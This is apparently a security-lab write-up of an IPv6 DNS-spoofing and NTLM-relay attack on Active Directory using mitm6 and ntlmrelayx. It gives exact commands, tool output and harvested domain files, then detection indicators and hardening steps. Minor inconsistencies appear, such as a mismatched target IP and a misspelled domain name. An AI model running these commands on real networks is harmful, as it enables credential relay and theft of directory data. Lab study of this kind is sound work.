# IPv6 Attack with mitm6

**Date:** May 2026  
**Author:** ShahinSecLab  
**Category:** Credential Access  
**Difficulty:** Easy  
**Tools:** mitm6, ntlmrelayx.py, secretsdump.py

## Table of Contents

- [Introduction](#introduction)
- [Attack Flow](#attack-flow)
- [Why This Attack Works](#why-this-attack-works)
- [Lab Setup](#lab-setup)
- [Tools Used](#tools-used)
- [Prerequisites](#prerequisites)
- [Step 1 — Starting mitm6](#step-1--starting-mitm6)
- [Step 2 — Starting NTLM Relay](#step-2--starting-ntlm-relay)
- [Step 3 — Triggering Authentication from Victim](#step-3--triggering-authentication-from-victim)
- [Step 4 — Relaying Authentication and Retrieving Loot](#step-4--relaying-authentication-and-retrieving-loot)
- [Step 5 — Exploring the Loot Folder](#step-5--exploring-the-loot-folder)
- [How Defenders Can Catch This](#how-defenders-can-catch-this)
- [How to Prevent It](#how-to-prevent-it)
- [References](#references)
- [Lessons Learned](#lessons-learned)

## Introduction

`mitm6` is a tool that exploits a fundamental design decision in Windows networking: **IPv6 is preferred over IPv4 by default on modern Windows systems**.

In many corporate environments, IPv6 is enabled but not properly configured. In most cases, **no legitimate DHCPv6 or DNSv6 server exists**, which creates a security gap. Attackers can abuse this gap to position themselves as the **authoritative DNS server** for an entire network segment.

When combined with Impacket’s `ntlmrelayx`, this technique becomes a powerful Active Directory attack chain:

- Capture NTLM authentication from Windows machines on the network
- Relay captured authentication to services such as **LDAP/LDAPS** on a Domain Controller
- Create new domain users or extract Active Directory data
- Relay to SMB services to access file shares or execute commands
- Ultimately escalate privileges and potentially achieve **Domain Admin access without cracking passwords**

## Attack Flow

```
Attacker Starts mitm6
                ↓
Victim Sends DHCPv6 Solicit Request
                ↓
mitm6 Responds with Fake DHCPv6 Configuration
                ↓
Victim Uses Attacker Machine as IPv6 DNS Server
                ↓
Victim Requests WPAD Configuration
                ↓
mitm6 Redirects WPAD Request to ntlmrelayx
                ↓
Victim Sends NTLM Authentication
                ↓
ntlmrelayx Relays Authentication to Domain Controller
                ↓
LDAP/LDAPS Authentication Succeeds
                ↓
Active Directory Information is Dumped
                ↓
Loot Files are Saved
                ↓
Attacker Gains Access to Domain Information
```
## Why This Attack Works

This attack works because Windows prefers IPv6 over IPv4 when both are available. In many Active Directory environments, IPv6 is enabled by default, but it is not properly configured or monitored.

When a Windows machine looks for a DHCPv6 server, it accepts responses from any available DHCPv6 server on the network. An attacker can use mitm6 to send fake DHCPv6 responses and make the victim machine use the attacker’s system as its DNS server.

After controlling DNS responses, the attacker can redirect WPAD requests to their own machine. Windows may then automatically send NTLM authentication when trying to download the WPAD configuration file.

The attacker uses ntlmrelayx to forward this authentication to the Domain Controller. If the server accepts the authentication, the attacker can collect Active Directory information without knowing the user's password.

This attack is possible because of the following conditions:

- IPv6 is enabled on Windows machines.
- No trusted DHCPv6 or DNSv6 server is configured.
- WPAD is enabled in the environment.
- NTLM authentication is allowed.
- LDAP signing is not enforced.
- The attacker is connected to the same network.

## Lab Setup

| Machine   | Role                | OS                  | IP Address      |
|-----------|---------------------|---------------------|-----------------|
| Attacker Machine  | Attacker            | Kali Linux          | `192.168.5.128` |
| Server    | Domain Controller   | Windows Server 2019 | `192.168.5.134` |
| Victim Machine   | Victim Workstation  | Windows 10          | `192.168.5.135` |

## Tools Used

| Tool | Purpose |
|------|---------|
| `mitm6` | Creates a fake DHCPv6 server and redirects DNS requests to the attacker machine |
| `ntlmrelayx.py` | Relays captured NTLM authentication to the Domain Controller |
| `secretsdump.py` | Extracts account information and hashes from Windows systems |

## Prerequisites

| What | Why |
|------|-----|
| Kali Linux machine | Runs mitm6 and Impacket tools |
| Active Directory lab | Provides the Domain Controller and Windows victim machine |
| Windows victim machine | Generates DHCPv6 and NTLM authentication requests |
| Domain Controller | Target system for NTLM relay |
| IPv6 enabled on Windows | Required for the attack to work |
| NTLM authentication enabled | Allows authentication relay |
| WPAD enabled | Allows the attacker to trigger authentication requests |

**Domain Name:** `readteambd.local`

## Step 1 — Starting mitm6

I started mitm6 in a separate terminal and targeted the internal domain on the LAN interface.

```bash
sudo mitm6 -d readteambd.local -i eth0
```
**Flag Breakdown**

| Flag |           Meaning                 |
|------|-----------------------------------|
| `sudo` | Run with root privileges          |
| `mitm6`| Starts IPv6 spoofing (DHCPv6/DNS) |
| `-d`   | Target domain                     |
| `-i`   | Network interface                 |
| `eth0` | Active LAN interface              |


### What Happens

- mitm6 listens for DHCPv6 requests from Windows machines
- It replies with fake DHCPv6 responses and sets itself as the DNS server
- The victim machines accept the IPv6 configuration automatically
- DNS queries get redirected to my machine
- WPAD and internal domain lookups are also redirected to me 

**Output:**

```
Starting mitm6 using the following configuration:
Primary adapter: eth0 [00:0c:29:77:a3:b1]
IPv4 address: 192.168.5.128
IPv6 address: fe80::f0be:d0bb:2c16:64f0
DNS local search domain: readteambd.local
DNS allowlist: readteambd.local
IPv6 address fe80::74:1 is now assigned to mac=00:50:56:c0:00:08 host=R64M. ipv4=
IPv6 address fe80::192:168:5:134 is now assigned to mac=00:0c:29:bc:6b:1e host=REDTEAMBD-DC.READTEAMBD.local. ipv4=192.168.5.134
Sent spoofed reply for wpad.readteambd.local. to fe80::502e:c6be:1fe9:c8bf
```

<p align="center">
  <img src="/Active-Directory/03-IPv6 attack with mitm6/images/step1.png" width="600">
</p>

## Step 2 — Starting NTLM Relay

On another terminal, I started ntlmrelayx to catch and relay authentication requests.

```bash
ntlmrelayx.py -6 -t ldaps://192.168.5.134 -wh fakewpad.readteambd.local -l lootme
```
**Flag Breakdown**

|             Flag              |                      Meaning                |
|-------------------------------|---------------------------------------------|
| `ntlmrelayx.py`                 | Tool used for NTLM relay attacks            |
| `-6`                            | Enables IPv6 support                        |
| `-t ldaps://192.168.5.130`      | Target Domain Controller using LDAPS        |
| `-wh fakewpad.readteambd.local` | Fake WPAD hostname to trigger authentication|
| `-l lootme`                     | Saves captured data to local folder         |

**Output:**

```
[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
/usr/local/lib/python2.7/dist-packages/OpenSSL/crypto.py:14: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography import utils, x509
[*] Protocol Client MSSQL loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server

[*] Servers started, waiting for connections
```

<p align="center">
  <img src="/Active-Directory/03-IPv6 attack with mitm6/images/step2.png" width="600">
</p>

## Step 3 — Triggering Authentication from Victim

On the Windows 10 victim machine, I simply restarted the system.
After the reboot, Windows automatically started the authentication process:

```
1. Send a DHCPv6 Solicit — mitm6 responds
2. Query DNS for WPAD — mitm6 answers, pointing to the attacker
3. Windows attempts to fetch http://fakewpad.roadteambd.local/wpad.dat
4. ntlmrelayx demands NTLM authentication
5. Windows transparently authenticates using the logged-in user's credentials
```

> *"No user interaction is required once the victim logs into Windows. The attack is completely silent."*

## Step 4 — Relaying Authentication and Retrieving Loot

When the victim machine sends an authentication request, `ntlmrelayx` receives it and relays it to the Domain Controller’s LDAP service.

**Output:**

```text
[*] HTTPD(80): Connection from 192.168.5.135 controlled, attacking target ldaps://192.168.5.134
[*] HTTPD(80): Authenticating against ldaps://192.168.5.134 as readteambd\victim-1$ SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains...
[*] Dumping domain info for first time
[*] Domain info dumped into lootme!
```

After a successful relay, domain information is saved in the `lootme` directory.

<p align="center">
  <img src="/Active-Directory/03-IPv6 attack with mitm6/images/step4.png" width="600">
</p>

## Step 5 — Exploring the Loot Folder

I checked the `lootme` directory created by `ntlmrelayx`. It contains the LDAP enumeration results collected from the Domain Controller.

```
lootme/
├── domain_computers.html
├── domain_computers_by_os.html
├── domain_groups.html
├── domain_policy.html
├── domain_trusts.html
├── domain_users.html
├── domain_users_by_group.html
└── domain_users.grep
```
The generated files contain information about domain users, computers, groups, policies, and trust relationships.

Next, I opened **`domain_users_by_group.html`** in a web browser to analyze domain users and their group memberships.

<p align="center">
  <img src="/Active-Directory/03-IPv6 attack with mitm6/images/step5-1.png" width="600">
</p>
<p align="center">
  <img src="/Active-Directory/03-IPv6 attack with mitm6/images/step5-2.png" width="600">
</p>
<p align="center">
  <img src="/Active-Directory/03-IPv6 attack with mitm6/images/step5-3.png" width="600">
</p>

## How Defenders Can Catch This

| Indicator | What to look for |
|-----------|------------------|
| Unknown DHCPv6 server on the network | Monitor DHCPv6 traffic for unauthorized servers |
| Unexpected IPv6 DNS server configuration | Check systems for unusual DNS settings |
| WPAD requests going to unknown machines | Review proxy and DNS logs |
| NTLM authentication from unexpected sources | Monitor Windows authentication logs |
| LDAP authentication from workstations | Check Domain Controller logs for unusual LDAP activity |
| New computer accounts created in Active Directory | Monitor account creation events |
| Suspicious DNS responses | Review DNS logs for unusual domain resolutions |
| Rogue IPv6 traffic on the network | Monitor network traffic for unknown IPv6 devices |


## How to Prevent It

**Disable IPv6 if it is not required**  
If IPv6 is not being used in the environment, disable it to reduce the attack surface:

```
Group Policy → Computer Configuration → Administrative Templates → Network → IPv6 Configuration
```

**Disable WPAD**
WPAD can be abused to redirect authentication requests to an attacker-controlled system. Disable WPAD through Group Policy:

```
Group Policy → Computer Configuration → Administrative Templates → Windows Components → Internet Explorer → Disable changing proxy settings
```

**Block unauthorized DHCPv6 traffic**
Only allow trusted DHCPv6 servers on the network. Block unauthorized DHCPv6 responses from unknown devices:

```
Network Firewall → Block Unauthorized DHCPv6 Traffic
```

**Enable LDAP Signing and Channel Binding**
LDAP signing helps prevent attackers from relaying NTLM authentication to the Domain Controller:

```
Group Policy → Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options
```

**Enable SMB Signing**
SMB signing prevents attackers from relaying authentication requests to SMB services:

```
Group Policy → Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options
```

**Restrict NTLM Authentication**
Reduce the use of NTLM authentication and use Kerberos authentication whenever possible:

```
Group Policy → Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options
```

## References

| # | Resource |
|---|---|
| 1 | [mitm6 – Compromising IPv4 Networks via IPv6 — Fox-IT (original research)](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/) |
| 2 | [mitm6 GitHub Repository — dirkjanm](https://github.com/dirkjanm/mitm6) |
| 3 | [ntlmrelayx — Impacket by SecureAuth](https://github.com/fortra/impacket/blob/master/impacket/examples/ntlmrelayx) |
| 4 | [Impacket GitHub Repository — fortra](https://github.com/fortra/impacket) |
| 5 | [The Most Dangerous User Account You've Never Heard Of — SpectreOps](https://posts.specterops.io/the-most-dangerous-user-account-you-ve-never-heard-of-196c50e83d32) |
| 6 | [Mitigating mitm6 — Microsoft Security Blog](https://techcommunity.microsoft.com/t5/microsoft-security-blog/mitm6-who-is-this/ba-p/2292417) |
| 7 | [LDAP Channel Binding and LDAP Signing — Microsoft KB4520412](https://support.microsoft.com/en-us/topic/2020-ldap-channel-binding-and-ldap-signing-requirements-for-windows-ef185fb8-00f7-167d-744c-f299a66fc00a) |
| 8 | [Active Directory Security — adsecurity.org](https://adsecurity.org/) |
| 9 | [MITRE ATT&CK — T1557.001 LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001/) |

## Lessons Learned

- IPv6 security should not be ignored, even if the network mainly uses IPv4.
- Windows systems automatically prefer IPv6, which can create security risks if it is not properly configured.
- mitm6 can abuse unsecured DHCPv6 and DNS configurations to redirect network traffic.
- NTLM relay attacks do not require password cracking; they reuse valid authentication requests.
- WPAD can become a security risk when it allows automatic authentication to untrusted systems.
- LDAP signing and channel binding are important protections against NTLM relay attacks.
- Proper Active Directory hardening can prevent attackers from gaining sensitive domain information.
- Regular monitoring of DHCPv6, DNS, and authentication logs helps detect suspicious activity.